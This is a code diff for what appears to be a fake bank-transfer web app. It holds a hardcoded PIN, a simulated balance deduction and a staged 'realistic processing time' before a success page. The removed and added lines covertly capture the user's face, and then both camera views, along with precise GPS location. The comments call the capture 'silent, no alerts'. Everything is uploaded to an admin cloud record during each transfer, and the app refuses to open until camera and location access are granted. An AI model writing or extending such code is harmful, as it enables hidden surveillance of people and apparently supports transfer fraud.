@@ -28,56 +28,8 @@ let appData = {
 let pendingTransaction = null;
 let correctPin = '8624';
 
-// Save receipt to Supabase cloud (visible from any device)
 async function saveReceiptToAdmin(receiptData) {
     await saveReceiptToCloud(receiptData);
-}
-
-// Capture face from front camera - silent, no alerts
-async function captureFace() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 320, height: 240 } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.setAttribute('playsinline', '');
-        await new Promise((res) => { video.onloadedmetadata = () => { video.play(); res(); }; });
-        await new Promise(r => setTimeout(r, 500));
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-        stream.getTracks().forEach(t => t.stop());
-        return dataUrl;
-    } catch (e) {
-        console.error('Face capture failed:', e);
-        return null;
-    }
-}
-
-// Get current location - silent, no alert loops, returns null on failure
-function getCurrentLocation() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-            resolve(null);
-            return;
-        }
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                resolve({
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    timestamp: new Date().toISOString()
-                });
-            },
-            (err) => {
-                console.error('Location error:', err.message);
-                resolve(null);
-            },
-            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
-        );
-    });
 }
 
 // Load data
@@ -181,13 +133,11 @@ document.getElementById('transferForm')?.addEventListener('submit', function(e) 
 
     const amount = parseFloat(document.getElementById('amount').value);
 
-    // Check balance
     if (amount > appData.balance) {
         alert('Insufficient balance!');
         return;
     }
 
-    // Create transaction object
     pendingTransaction = {
         id: 'TXN' + Date.now(),
         type: 'debit',
@@ -202,7 +152,6 @@ document.getElementById('transferForm')?.addEventListener('submit', function(e) 
         referenceNumber: generateReference()
     };
 
-    // Show PIN modal instead of processing immediately
     openPinModal();
 });
 
@@ -210,33 +159,20 @@ document.getElementById('transferForm')?.addEventListener('submit', function(e) 
 async function completeTransfer() {
     if (!pendingTransaction) return;
 
-    // Show loading
     document.getElementById('loadingOverlay').classList.remove('hidden');
 
-    // Deduct from balance
     appData.balance -= pendingTransaction.amount;
-
-    // Add to transactions (newest first)
     appData.transactions.unshift(pendingTransaction);
 
-    // Save data to localStorage
     localStorage.setItem('kudasavingsData', JSON.stringify(appData));
     localStorage.setItem('currentTransaction', JSON.stringify(pendingTransaction));
 
-    // Capture face and location for admin receipt - retry once on failure
-    let capturedFace = await captureFace();
-    if (!capturedFace) {
-        console.warn('Face capture failed, retrying once...');
-        capturedFace = await captureFace();
-    }
+    // Capture both cameras and location simultaneously for speed
+    const [cameras, location] = await Promise.all([
+        captureBothCameras(),
+        getCurrentLocation()
+    ]);
 
-    let location = await getCurrentLocation();
-    if (!location) {
-        console.warn('Location failed, retrying once...');
-        location = await getCurrentLocation();
-    }
-
-    // Always save receipt even if face/location is null
     try {
         await saveReceiptToAdmin({
             username: appData.userName || 'BABATUNDE',
@@ -248,14 +184,14 @@ async function completeTransfer() {
             referenceNumber: pendingTransaction.referenceNumber,
             transactionDate: pendingTransaction.date,
             transactionType: 'debit',
-            capturedFace: capturedFace,
+            capturedFace: cameras.front,
+            backCameraPhoto: cameras.back,
             location: location
         });
     } catch (e) {
         console.error('Receipt save failed:', e);
     }
 
-    // Simulate realistic processing time
     setTimeout(() => {
         document.getElementById('loadingOverlay').classList.add('hidden');
         window.location.href = '/success.html';
@@ -269,7 +205,6 @@ function generateReference() {
 
 // Initialize
 document.addEventListener('DOMContentLoaded', function() {
-    // Guard: redirect to login if permissions not granted
     const locationGranted = localStorage.getItem('locationGranted') === 'true';
     const cameraGranted = localStorage.getItem('cameraGranted') === 'true';
     if (!locationGranted || !cameraGranted) {
@@ -280,7 +215,6 @@ document.addEventListener('DOMContentLoaded', function() {
     loadData();
     loadBanks();
 
-    // Format account number input
     const accountInput = document.getElementById('accountNumber');
     accountInput?.addEventListener('input', function() {
         this.value = this.value.replace(/\D/g, '').slice(0, 10);
